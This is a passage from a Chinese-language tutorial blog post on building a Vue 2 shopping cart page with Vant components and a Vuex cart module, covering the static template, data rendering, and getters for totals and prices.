/&gt;</span><br><span class="line">        &lt;span&gt;购物车&lt;/span&gt;</span><br><span class="line">      &lt;/div&gt;</span><br></pre></td></tr></tbody></table></figure><p>导入并将商品规格赋值给 data 数据</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> { addCart } <span class="keyword">from</span> <span class="string">'@/api/cart'</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="title function_">created</span> () {</span><br><span class="line">    <span class="comment">// 获取商品详情-说明部分</span></span><br><span class="line">    <span class="keyword">const</span> goodsId = <span class="variable language_">this</span>.<span class="property">detailId</span></span><br><span class="line">    <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">getGoodsDetail</span>(goodsId)</span><br><span class="line">    <span class="comment">// console.log(res)</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">goodsDetailObj</span> = res.<span class="property">data</span>.<span class="property">detail</span></span><br><span class="line">    <span class="comment">// console.log(this.goodsDetailObj)</span></span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">goodsSkuId</span> = <span class="variable language_">this</span>.<span class="property">goodsDetailObj</span>.<span class="property">skuList</span>[<span class="number">0</span>].<span class="property">goods_sku_id</span> <span class="comment">// 得到商品规格id</span></span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">images</span> = <span class="variable language_">this</span>.<span class="property">goodsDetailObj</span>.<span class="property">goods_images</span> <span class="comment">// 得到商品轮播图</span></span><br><span class="line">...</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>提供 data 数据来接收必要信息</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">addCount</span>: <span class="number">1</span>, <span class="comment">// 加入购物车的商品数量</span></span><br><span class="line"><span class="attr">goodsSkuId</span>: <span class="number">0</span>, <span class="comment">// 商品规格id</span></span><br><span class="line"><span class="attr">cartTotal</span>: <span class="number">0</span>, <span class="comment">// 购物车内商品总数</span></span><br></pre></td></tr></tbody></table></figure><p>编写请求代码</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 加入购物车判断登录状态</span></span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">addCart</span> () {</span><br><span class="line">      ...</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 说明有token，可以直接加入购物车</span></span><br><span class="line">      <span class="keyword">const</span> { data } = <span class="keyword">await</span> <span class="title function_">addCart</span>(<span class="variable language_">this</span>.<span class="property">detailId</span>, <span class="variable language_">this</span>.<span class="property">addCount</span>, <span class="variable language_">this</span>.<span class="property">goodsSkuId</span>)</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">cartTotal</span> = data.<span class="property">cartTotal</span></span><br><span class="line">      <span class="variable language_">this</span>.$toast(<span class="string">'加入购物车成功！'</span>)</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">showPannel</span> = <span class="literal">false</span> <span class="comment">// 关闭弹层</span></span><br><span class="line">    }</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><h2 id="购物车页面"><a class="markdownIt-Anchor" href="#购物车页面"></a> 购物车页面</h2><p>需求分析：</p><ol><li>基本静态结构 (快速实现）</li><li>构建 vuexcart 模块，获取数据存储</li><li>基于数据居动态渲染购物车列表</li><li>封装 getters 实现动态统计</li><li>全选反选功能</li><li>数字框修改数量功能</li><li>编辑切换状态，删除功能</li><li>空购物车处理</li></ol><h3 id="静态页面"><a class="markdownIt-Anchor" href="#静态页面"></a> 静态页面</h3><p>修改 <code>layout/cart.vue</code></p><p>使用到了 vant 的 Checkbox, CheckboxGroup 组件</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> { <span class="title class_">Checkbox</span>, <span class="title class_">CheckboxGroup</span> } <span class="keyword">from</span> <span class="string">"vant"</span>;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">Checkbox</span>);</span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">CheckboxGroup</span>);</span><br></pre></td></tr></tbody></table></figure><p>静态页面如下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class="cart"&gt;</span><br><span class="line">    &lt;van-nav-bar title="购物车" fixed /&gt;</span><br><span class="line">    &lt;!-- 购物车开头 --&gt;</span><br><span class="line">    &lt;div class="cart-title"&gt;</span><br><span class="line">      &lt;span class="all"&gt;共&lt;i&gt;4&lt;/i&gt;件商品&lt;/span&gt;</span><br><span class="line">      &lt;span class="edit"&gt;</span><br><span class="line">        &lt;van-icon name="edit" /&gt;</span><br><span class="line">        编辑</span><br><span class="line">      &lt;/span&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- 购物车列表 --&gt;</span><br><span class="line">    &lt;div class="cart-list"&gt;</span><br><span class="line">      &lt;div class="cart-item" v-for="item in 10" :key="item"&gt;</span><br><span class="line">        &lt;van-checkbox&gt;&lt;/van-checkbox&gt;</span><br><span class="line">        &lt;div class="show"&gt;</span><br><span class="line">          &lt;img</span><br><span class="line">            src="http://cba.itlike.com/public/uploads/10001/20230321/a072ef0eef1648a5c4eae81fad1b7583.jpg"</span><br><span class="line">            alt=""</span><br><span class="line">          /&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class="info"&gt;</span><br><span class="line">          &lt;span class="tit text-ellipsis-2"</span><br><span class="line">            &gt;新Pad 14英寸 12+128 远峰蓝 M6平板电脑</span><br><span class="line">            智能安卓娱乐十核游戏学习二合一</span><br><span class="line">            低蓝光护眼超清4K全面三星屏5GWIFI全网通 蓝魔快本平板&lt;/span</span><br><span class="line">          &gt;</span><br><span class="line">          &lt;span class="bottom"&gt;</span><br><span class="line">            &lt;div class="price"&gt;¥ &lt;span&gt;1247.04&lt;/span&gt;&lt;/div&gt;</span><br><span class="line">            &lt;div class="count-box"&gt;</span><br><span class="line">              &lt;button class="minus"&gt;-&lt;/button&gt;</span><br><span class="line">              &lt;input class="inp" :value="4" type="text" readonly /&gt;</span><br><span class="line">              &lt;button class="add"&gt;+&lt;/button&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">          &lt;/span&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class="footer-fixed"&gt;</span><br><span class="line">      &lt;div class="all-check"&gt;</span><br><span class="line">        &lt;van-checkbox icon-size="18"&gt;&lt;/van-checkbox&gt;</span><br><span class="line">        全选</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">      &lt;div class="all-total"&gt;</span><br><span class="line">        &lt;div class="price"&gt;</span><br><span class="line">          &lt;span&gt;合计：&lt;/span&gt;</span><br><span class="line">          &lt;span&gt;¥ &lt;i class="totalPrice"&gt;99.99&lt;/i&gt;&lt;/span&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div v-if="true" class="goPay"&gt;结算(5)&lt;/div&gt;</span><br><span class="line">        &lt;div v-else class="delete"&gt;删除&lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default {</span><br><span class="line">  name: "CartPage",</span><br><span class="line">};</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang="less" scoped&gt;</span><br><span class="line">// 主题 padding</span><br><span class="line">.cart {</span><br><span class="line">  padding-top: 46px;</span><br><span class="line">  padding-bottom: 100px;</span><br><span class="line">  background-color: #f5f5f5;</span><br><span class="line">  min-height: 100vh;</span><br><span class="line">  .cart-title {</span><br><span class="line">    height: 40px;</span><br><span class="line">    display: flex;</span><br><span class="line">    justify-content: space-between;</span><br><span class="line">    align-items: center;</span><br><span class="line">    padding: 0 10px;</span><br><span class="line">    font-size: 14px;</span><br><span class="line">    .all {</span><br><span class="line">      i {</span><br><span class="line">        font-style: normal;</span><br><span class="line">        margin: 0 2px;</span><br><span class="line">        color: #fa2209;</span><br><span class="line">        font-size: 16px;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    .edit {</span><br><span class="line">      .van-icon {</span><br><span class="line">        font-size: 18px;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  .cart-item {</span><br><span class="line">    margin: 0 10px 10px 10px;</span><br><span class="line">    padding: 10px;</span><br><span class="line">    display: flex;</span><br><span class="line">    justify-content: space-between;</span><br><span class="line">    background-color: #ffffff;</span><br><span class="line">    border-radius: 5px;</span><br><span class="line"></span><br><span class="line">    .show img {</span><br><span class="line">      width: 100px;</span><br><span class="line">      height: 100px;</span><br><span class="line">    }</span><br><span class="line">    .info {</span><br><span class="line">      width: 210px;</span><br><span class="line">      padding: 10px 5px;</span><br><span class="line">      font-size: 14px;</span><br><span class="line">      display: flex;</span><br><span class="line">      flex-direction: column;</span><br><span class="line">      justify-content: space-between;</span><br><span class="line"></span><br><span class="line">      .bottom {</span><br><span class="line">        display: flex;</span><br><span class="line">        justify-content: space-between;</span><br><span class="line">        .price {</span><br><span class="line">          display: flex;</span><br><span class="line">          align-items: flex-end;</span><br><span class="line">          color: #fa2209;</span><br><span class="line">          font-size: 12px;</span><br><span class="line">          span {</span><br><span class="line">            font-size: 16px;</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">        .count-box {</span><br><span class="line">          display: flex;</span><br><span class="line">          width: 110px;</span><br><span class="line">          .add,</span><br><span class="line">          .minus {</span><br><span class="line">            width: 30px;</span><br><span class="line">            height: 30px;</span><br><span class="line">            outline: none;</span><br><span class="line">            border: none;</span><br><span class="line">          }</span><br><span class="line">          .inp {</span><br><span class="line">            width: 40px;</span><br><span class="line">            height: 30px;</span><br><span class="line">            outline: none;</span><br><span class="line">            border: none;</span><br><span class="line">            background-color: #efefef;</span><br><span class="line">            text-align: center;</span><br><span class="line">            margin: 0 5px;</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">.footer-fixed {</span><br><span class="line">  position: fixed;</span><br><span class="line">  left: 0;</span><br><span class="line">  bottom: 50px;</span><br><span class="line">  height: 50px;</span><br><span class="line">  width: 100%;</span><br><span class="line">  border-bottom: 1px solid #ccc;</span><br><span class="line">  background-color: #fff;</span><br><span class="line">  display: flex;</span><br><span class="line">  justify-content: space-between;</span><br><span class="line">  align-items: center;</span><br><span class="line">  padding: 0 10px;</span><br><span class="line"></span><br><span class="line">  .all-check {</span><br><span class="line">    display: flex;</span><br><span class="line">    align-items: center;</span><br><span class="line">    .van-checkbox {</span><br><span class="line">      margin-right: 5px;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  .all-total {</span><br><span class="line">    display: flex;</span><br><span class="line">    line-height: 36px;</span><br><span class="line">    .price {</span><br><span class="line">      font-size: 14px;</span><br><span class="line">      margin-right: 10px;</span><br><span class="line">      .totalPrice {</span><br><span class="line">        color: #fa2209;</span><br><span class="line">        font-size: 18px;</span><br><span class="line">        font-style: normal;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    .goPay,</span><br><span class="line">    .delete {</span><br><span class="line">      min-width: 100px;</span><br><span class="line">      height: 36px;</span><br><span class="line">      line-height: 36px;</span><br><span class="line">      text-align: center;</span><br><span class="line">      background-color: #fa2f21;</span><br><span class="line">      color: #fff;</span><br><span class="line">      border-radius: 18px;</span><br><span class="line">      &amp;.disabled {</span><br><span class="line">        background-color: #ff9779;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="构建-vuex-cart-模块"><a class="markdownIt-Anchor" href="#构建-vuex-cart-模块"></a> 构建 vuex cart 模块</h3><p>新建子模块 cart：<code>@/store/modules/cart</code></p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> { getCartList } <span class="keyword">from</span> <span class="string">"@/api/cart"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> {</span><br><span class="line">  <span class="attr">namespaced</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="title function_">state</span>(<span class="params"></span>) {</span><br><span class="line">    <span class="keyword">return</span> {</span><br><span class="line">      <span class="comment">// 提供一个数组用于存储购物车列表</span></span><br><span class="line">      <span class="attr">cartList</span>: [],</span><br><span class="line">    };</span><br><span class="line">  },</span><br><span class="line">  <span class="attr">mutations</span>: {</span><br><span class="line">    <span class="comment">// 提供方法可以设置购物车列表</span></span><br><span class="line">    <span class="title function_">setCartList</span>(<span class="params">state, newCartList</span>) {</span><br><span class="line">      state.<span class="property">cartList</span> = newCartList;</span><br><span class="line">    },</span><br><span class="line">  },</span><br><span class="line">  <span class="attr">actions</span>: {</span><br><span class="line">    <span class="comment">// 异步获取购物车列表</span></span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">getCartAction</span>(<span class="params">context</span>) {</span><br><span class="line">      <span class="keyword">const</span> { data } = <span class="keyword">await</span> <span class="title function_">getCartList</span>();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 由于后台返回数据中不包括是否选中的状态，所以本地自己维护，给每一项添加上被选中的状态</span></span><br><span class="line">      data.<span class="property">list</span>.<span class="title function_">forEach</span>(<span class="function">(<span class="params">element</span>) =&gt;</span> {</span><br><span class="line">        element.<span class="property">isChecked</span> = <span class="literal">true</span>;</span><br><span class="line">      });</span><br><span class="line">      context.<span class="title function_">commit</span>(<span class="string">"setCartList"</span>, data.<span class="property">list</span>);</span><br><span class="line">    },</span><br><span class="line">  },</span><br><span class="line">  <span class="attr">getters</span>: {},</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>到 vuex 中挂载：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Cart</span> <span class="keyword">from</span> <span class="string">'@/store/modules/cart'</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">  <span class="attr">modules</span>: {</span><br><span class="line">    <span class="title class_">User</span>,</span><br><span class="line">    <span class="title class_">Cart</span></span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><p>购物车页面中使用 created 调用 actions 异步</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">created</span> () {</span><br><span class="line">  <span class="comment">// 判断是否登录</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">$store</span>.<span class="property">getters</span>.<span class="property">token</span>) {</span><br><span class="line">    <span class="comment">// 获取购物车数据</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">dispatch</span>(<span class="string">'Cart/getCartAction'</span>)</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><h3 id="动态渲染"><a class="markdownIt-Anchor" href="#动态渲染"></a> 动态渲染</h3><p>接口地址：/cart/list</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202408311201545.png" alt="image-20240831120141410"></p><p>使用辅助函数映射数组：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> { mapState } <span class="keyword">from</span> <span class="string">'vuex'</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  <span class="attr">computed</span>: {</span><br><span class="line">    ...<span class="title function_">mapState</span>(<span class="string">'Cart'</span>, [<span class="string">'cartList'</span>])</span><br><span class="line">  },</span><br></pre></td></tr></tbody></table></figure><p>将 template 中对应的地方进行改造：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class="cart-list"&gt;</span><br><span class="line">      &lt;div class="cart-item" v-for="item in cartList" :key="item.goods_id"&gt;</span><br><span class="line">        &lt;van-checkbox :value="item.isChecked"&gt;&lt;/van-checkbox&gt;</span><br><span class="line">        &lt;div class="show"&gt;</span><br><span class="line">          &lt;img :src="item.goods.goods_image" alt=""&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class="info"&gt;</span><br><span class="line">          &lt;span class="tit text-ellipsis-2"&gt;{{ item.goods.goods_name }}&lt;/span&gt;</span><br><span class="line">          &lt;span class="bottom"&gt;</span><br><span class="line">            &lt;div class="price"&gt;¥ &lt;span&gt;{{ item.goods.goods_price_min }}&lt;/span&gt;&lt;/div&gt;</span><br><span class="line">            &lt;CountBox :value="item.goods_num"&gt;&lt;/CountBox&gt;</span><br><span class="line">          &lt;/span&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br></pre></td></tr></tbody></table></figure><p>但未完成其他功能按钮等事件。</p><h3 id="封装-getters-实现动态统计"><a class="markdownIt-Anchor" href="#封装-getters-实现动态统计"></a> 封装 getters 实现动态统计</h3><ul><li>合计商品数量</li></ul><p>合计商品数量使用到 getters</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">getters</span>: {</span><br><span class="line">  <span class="comment">// 求所有的商品累加总数</span></span><br><span class="line">  <span class="title function_">countCartTotal</span> (state) {</span><br><span class="line">    <span class="keyword">return</span> state.<span class="property">cartList</span>.<span class="title function_">reduce</span>(<span class="function">(<span class="params">sum, item, index</span>) =&gt;</span> sum + item.<span class="property">goods_num</span>, <span class="number">0</span>)</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><a href="https://segmentfault.com/a/1190000044748736">reduce 函数的 20 个高级用法</a></p><ul><li>合计价格</li><li>结算</li></ul><p>最终完整结果：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">getters</span>: {</span><br><span class="line">    <span class="comment">// 求所有的商品累加总数</span></span><br><span class="line">    <span class="title function_">countCartTotal</span> (state) {</span><br><span class="line">      <span class="keyword">return</span> state.<span class="property">cartList</span>.<span class="title function_">reduce</span>(<span class="function">(<span class="params">sum, item, index</span>) =&gt;</span> sum + item.<span class="property">goods_num</span>, <span class="number">0</span>)</span><br><span class="line">    },</span><br><span class="line">    <span class="comment">// 选中的商品项目</span></span><br><span class="line">    <span class="title function_">selectedCartList</span> (state) {</span><br><span class="line">      <span class="comment">// filter只会接收回调结果为true的元素，所以可以不用做其他判断</span></span><br><span class="line">      <span class="keyword">return</span> state.<span class="property">cartList</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">isChecked</span>)</span><br><span class="line">    },</span><br><span class="line">    <span class="comment">// 选中的商品项目数量</span></span><br><span class="line">    <span class="title function_">selectedCartCount</span> (state, getters) { <span class="comment">// 这里的getters可以获取到上面定义的getters</span></span><br><span class="line">      <span class="keyword">return</span> <span class="title class_">Array</span>.<span class="title function_">isArray</span>(getters.<span class="property">selectedCartList</span>) ? getters.<span class="property">selectedCartList</span>.<span class="title function_">reduce</span>(<span class="function">(<span class="params">sum, item, index</span>) =&gt;</span> sum + item.<span class="property">goods_num</span>, <span class="number">0</span>) : <span class="number">0</span></span><br><span class="line">    },</span><br><span class="line">    <span class="comment">// 选中的商品总价</span></span><br><span class="line">    <span class="title function_">selectedPrice</span> (state, getters) {</span><br><span class="line">      <span class="comment">// toFixed(2) 保留两位小数</span></span><br><span class="line">      <span class="keyword">return</span> <span class="title class_">Array</span>.<span class="title function_">isArray</span>(getters.<span class="property">selectedCartList</span>) ? getters.<span class="property">selectedCartList</span>.<span class="title function_">reduce</span>(<span class="function">(<span class="params">sum, item, index</span>) =&gt;</span> sum + item.<span class="property">goods_num</span> * item.<span class="property">goods</span>.<span class="property">goods_price_min</span>, <span class="number">0</span>).<span class="title function_">toFixed</span>(<span class="number">2</span>) : <span class="number">0</span></span><br><span class="line">    }</span><br><span class="line">  }</span><br></pre></td></tr></tbody></table></figure><p>修改购物车页面的相关 template</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;span class="all"&gt;共&lt;i&gt;{{ countCartTotal }}&lt;/i&gt;件商品&lt;/span&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;div class="all-total"&gt;</span><br><span class="line">        &lt;div class="price"&gt;</span><br><span class="line">          &lt;span&gt;合计：&lt;/span&gt;</span><br><span class="line">          &lt;span&gt;¥ &lt;i class="totalPrice"&gt;{{selectedPrice}}&lt;/i&gt;&lt;/span&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div v-if="true" class="goPay" :class="{disabled: selectedCartCount === 0}"&gt;结算({{selectedCartCount}})&lt;/div&gt;</span><br><span class="line">        &lt;div v-else class="delete" :class="{disabled: selectedCartCount === 0}"&gt;删除&lt;/div&gt;</span><br><span class="line">      &lt;/div&gt;</span><br></pre></td></tr></tbody></table></figure><h3 id="全选反选"><a class="markdownIt-Anchor" href="#全选反选"></a> 全选反选</h3><p>提供 mutations 便于修改 state</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">  <span 